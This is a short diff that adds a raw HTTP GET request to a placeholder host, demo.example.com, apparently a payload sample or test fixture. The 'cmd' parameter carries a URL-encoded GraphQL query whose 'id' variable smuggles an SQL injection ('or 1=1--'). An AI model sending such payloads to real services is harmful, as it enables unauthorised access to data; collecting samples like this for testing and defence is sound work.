@@ -1,0 +1,4 @@
+GET /a?cmd={"query":"query%0ax($id:String){user(where:{id:{eq:$id}}){id}}","variables":{"id":"x\"%0aor%0a1%3D1--"}} HTTP/1.1
+Host: demo.example.com
+Connection: close
+
